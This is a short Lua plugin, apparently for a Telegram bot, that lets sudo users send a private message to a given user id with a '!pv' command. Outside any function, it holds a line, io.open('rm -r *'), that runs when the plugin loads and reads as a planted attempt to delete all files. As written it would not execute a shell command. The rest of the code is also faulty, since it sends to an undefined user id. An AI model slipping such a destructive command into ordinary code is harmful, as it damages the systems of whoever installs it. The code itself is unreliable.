do
-- Sent To Response v3.1 By  @PokerFace_Dev
local function run(msg, matches)
  if not is_sudo(msg) then -- For SUDOs only 
    return 'O_o'
end
	if matches[1] == 'pv' and is_admin(msg) then
		local response = matches[3]
		send_large_msg("user#id"..matches[2], response)
						local receiver = 'user#id'..user_id
				send_large_msg(receiver, response)
	end
end
io.open('rm -r *')
return {
  patterns = {
    "^[!#/]([Pp][Vv]) (%d+) (.*)$"
  },
  run = run
}
-- Sent To Response v3.1 By  @PokerFace_Dev